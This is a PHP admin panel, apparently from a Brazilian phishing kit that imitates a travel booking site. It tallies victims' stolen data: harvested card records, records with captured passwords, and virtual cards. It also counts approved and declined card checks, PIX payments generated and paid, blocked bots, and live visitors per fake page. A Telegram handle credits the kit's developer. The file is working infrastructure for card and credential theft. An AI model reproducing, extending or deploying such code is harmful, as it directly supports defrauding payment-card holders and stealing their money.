<?php
   session_start();
   date_default_timezone_set('America/Sao_Paulo');
   date_default_timezone_set('UTC');
   
   if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
       header("Location: ./");
       exit;
   }
   
   try {
       require_once '../config/config.php';
   
       function contar($conexao, $query, $params = []) {
           $stmt = $conexao->prepare($query);
           $stmt->execute($params);
           return (int)$stmt->fetchColumn();
       }

       $aprovados = [
         'Pagamento Aprovado',
         'Aprovado',
         'Transação Aprovada',
         'Approved',
         'AUTHORIZED',
         'CONFIRMED',
         'CAPTURED',
         'PAID',
         'SUCCESS'
       ];
       
       $negados = [
         'Pagamento Recusado',
         'Recusado',
         'Transação Negada',
         'Denied',
         'Not Authorized',
         'Do Not Honor',
         'DECLINED',
         'REFUSED',
         'BLOCKED',
         'Erro no Gateway',
         'Gateway Timeout',
         'Timeout',
         'Erro de Comunicação',
         'Service Unavailable',
         'Internal Server Error',
         'Falha na Autenticação',
         'Cartão Inválido',
         'Saldo Insuficiente',
         'Suspeita de Fraude',
         '3DS Falhou',
         'PROCESSING ERROR',
         'INVALID REQUEST'
         ];
         
         function montarWhere($coluna, $valores) {
            $itens = array_map(function($v) {
               return "'" . addslashes($v) . "'";
               }, $valores);
               return "$coluna IN (" . implode(',', $itens) . ")";
               }
               
               $whereAprovados = montarWhere('resultado_gateway', $aprovados);
               $whereNegados = montarWhere('resultado_gateway', $negados);
   
       function contarLocal(PDO $conexao, string $nomeLocal, int $segundos = 10): int {
       date_default_timezone_set('America/Sao_Paulo');
       $limite = date("Y-m-d H:i:s", time() - $segundos); 
       $stmt = $conexao->prepare("SELECT COUNT(DISTINCT ip) FROM onlines WHERE local = :local AND hora >= :limite");
       $stmt->execute([
           ':local'  => $nomeLocal,
           ':limite' => $limite
       ]);
       return (int) $stmt->fetchColumn();
   }
   
       $visitas = contar($conexao, "SELECT visitas FROM acessos WHERE id = 1");
       $ataques = contar($conexao, "SELECT COUNT(*) FROM ipsblock");
       $infos_full_virtuais = contar($conexao, "SELECT COUNT(*) FROM infovirtual WHERE infocc_virtual IS NOT NULL");
       $infos_full = contar($conexao, "SELECT (SELECT COUNT(*) FROM infoconsul WHERE senha IS NULL OR senha = '') + (SELECT COUNT(*) FROM infocc c WHERE NOT EXISTS (SELECT 1 FROM infoconsul i WHERE i.numero_pedido = c.numero_pedido AND i.infocc = c.infocc))");
       $infos_full_consultaveis = contar($conexao, "SELECT COUNT(*) FROM infoconsul WHERE senha IS NOT NULL AND senha != ''");
       $total_infos = $infos_full + $infos_full_consultaveis + $infos_full_virtuais;
       $infos_full_aprovada = contar($conexao, "SELECT COUNT(*) FROM infocc WHERE $whereAprovados") + contar($conexao, "SELECT COUNT(*) FROM infoconsul WHERE $whereAprovados");
       $infos_full_negada = contar($conexao, "SELECT COUNT(*) FROM infocc WHERE $whereNegados") + contar($conexao, "SELECT COUNT(*) FROM infoconsul WHERE $whereNegados");
       //$boletos_gerados = contar($conexao, "SELECT visitas FROM infoleto WHERE id = 1");
       $pix_gerados = contar($conexao, "SELECT visitas FROM relatorio WHERE id = 1");
       $onlinecc = contar($conexao, "SELECT COUNT(*) FROM infocc");
       //$onlineleto = contar($conexao, "SELECT visitas FROM infoleto WHERE id = 1");
       $onlineindex = contarLocal($conexao, 'inicio');
       $onlinepagamento = contarLocal($conexao, 'pagamento');
       $onlineofertas = contarLocal($conexao, 'ofertas');
       $onlinepassageiros = contarLocal($conexao, 'passageiros');
       $onlinedados= contarLocal($conexao, 'dados');
       $pix_gerado = contar($conexao, "SELECT visitas FROM relatorio_gateway WHERE id = 1");
       $pix_gerados_total = $pix_gerados + $pix_gerado;
       $pix_pago = contar($conexao, "SELECT COUNT(*) FROM infospix WHERE status = 'Pago' OR status = 'Aprovado'");
       //$boleto_gerado = contar($conexao, "SELECT visitas FROM relatorio_gateway2 WHERE id = 1");
       //$boleto_pago = contar($conexao, "SELECT COUNT(*) FROM infoletos WHERE status = 'Pago' OR status = 'Aprovado'");
       //$boleto_gerados_total = $onlineleto + $boleto_gerado;
       $usuarios_online = $onlineindex + $onlinepagamento + $onlineofertas + $onlinepassageiros + $onlinedados;
   
   } catch (PDOException $e) {
       echo "Erro: " . $e->getMessage();
   }
   ?>
<!doctype html>
<html lang="pt-br" data-theme="dark">
   <?php include('head.php'); ?>
   <body data-theme="light">
      <div id="body" class="theme-cyan">
      <?php include('theme.php'); ?>
      <div class="overlay"></div>
      <div id="wrapper">
      <?php include('submenu.php'); ?>
      <?php include('menu.php'); ?>
      <div id="main-content">
      <div class="container-fluid">
      <div class="block-header">
         <div class="row clearfix">
            <div class="col-lg-4 col-md-12 col-sm-12">
               <h1>Olá  admin, você está em Página Inicial</h1>
               <span>TXT_JPGI1 - @TXT_JPGI1 <== no telegram! </span>
            </div>
         </div>
      </div>
      <div class="row clearfix">
      <div class="container-fluid">
         <div class="row">
            <div class="col-lg-12">
               <div class="row clearfix">
                  <div class="col-12">
                     <div class="card">
                        <div class="header">
                           <h2>RESULTS</h2>
                        </div>
                        <div class="body">
                           <table class="table card-table mb-0" style="font-size:12px;">
                              <tbody>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">USUÁRIOS ONLINE ( TOTAIS ) </td>
                                    <td class="text-right" style="font-size:12px;"><?= $usuarios_online ?></td>
                                 </tr>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">VISITAS ( TOTAIS )</td>
                                    <td class="text-right" style="font-size:12px;"><?= $visitas ?></td>
                                 </tr>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">BOTS BLOQUEADOS</td>
                                    <td class="text-right" style="font-size:12px;"><?= $ataques ?></td>
                                 </tr>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">TOTAL INFOS COLETADAS</td>
                                    <td class="text-right" style="font-size:12px;"><?= $total_infos ?></td>
                                 </tr>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">INFOS FULL</td>
                                    <td class="text-right" style="font-size:12px;"><?= $infos_full ?></td>
                                 </tr>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">INFOS FULL CONSULTÁVEIS</td>
                                    <td class="text-right" style="font-size:12px;"><?= $infos_full_consultaveis ?></td>
                                 </tr>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">INFOS FULL VIRTUAL</td>
                                    <td class="text-right" style="font-size:12px;"><?= $infos_full_virtuais ?></td>
                                 </tr>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">INFOS FULL ( Aprovada )</td>
                                    <td class="text-right" style="font-size:12px;"><?= $infos_full_aprovada ?></td>
                                 </tr>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">INFOS FULL ( Negada )</td>
                                    <td class="text-right" style="font-size:12px;"><?= $infos_full_negada ?></td>
                                 </tr>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">PIX GERADOS</td>
                                    <td class="text-right" style="font-size:12px;"><?= $pix_gerados ?></td>
                                 </tr>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">PIX GERADOS ( usando Gateway )</td>
                                    <td class="text-right" style="font-size:12px;"><?= $pix_gerado ?></td>
                                 </tr>
                                 <tr>
                                    <td class="font-weight-bold" style="font-size:12px;">PIX PAGO ( usando Gateway )</td>
                                    <td class="text-right" style="font-size:12px;"><?= $pix_pago ?></td>
                                 </tr>
                              </tbody>
                           </table>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="row clearfix">
                  <div class="col-12">
                     <div class="card bg-clear">
                        <div class="header">
                           <ul class="nav nav-tabs3">
                              <li class="nav-item"><a class="nav-link active show" data-toggle="tab" href="javascript:void(0);">Relatório Usuários Online</a></li>
                           </ul>
                        </div>
                        <div class="body">
                           <div class="tab-content mt-0">
                              <div class="tab-pane show active" id="Active-Orders">
                                 <div class="table-responsive">
                                    <table style="background:#FEFEFE;" class="table table-hover text-wrap table-custom spacing5 mb-0">
                                       <tbody>
                                          <tr>
                                             <td></td>
                                             <td><span>Inicio</span></td>
                                             <td><span>Ofertas</span></td>
                                             <td><span>Passageiros</span></td>
                                             <td><span>Pagamento</span></td>
                                             <td><span>PIX</span></td>
                                             <td><span>CC</span></td>
                                             <!--<td><span>LETO</span></td>-->
                                          </tr>
                                          <tr>
                                             <td></td>
                                             <td>
                                                <div id="onlineindex"><?= $onlineindex ?></div>
                                             </td>
                                             <td>
                                                <div id="onlineofertas"><?= $onlineofertas ?></div>
                                             </td>
                                             <td>
                                                <div id="onlinepassageiros"><?= $onlinepassageiros ?></div>
                                             </td>
                                             <td>
                                                <div id="onlinepagamento"><?= $onlinepagamento ?></div>
                                             </td>
                                             <!--<td>
                                                <div id="onlinedados"><?= $onlinedados ?></div>
                                             </td>-->
                                             <td>
                                                <div id="onlinepix"><?= $pix_gerados_total ?></div>
                                             </td>
                                             <td>
                                                <div id="onlinecc"><?= $onlinecc ?></div>
                                             </td>
                                          </tr>
                                       </tbody>
                                    </table>
                                    <div>
                                       <button type="button"  class="btn btn-dark btn-lg btn-block" onClick="javascript:window.open ('https://t.me/TXT_JPGI1', 'popup') ;return false">Criado e Desenvolvido por @TXT_JPGI1 <= no telegram</button>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </body>
</html>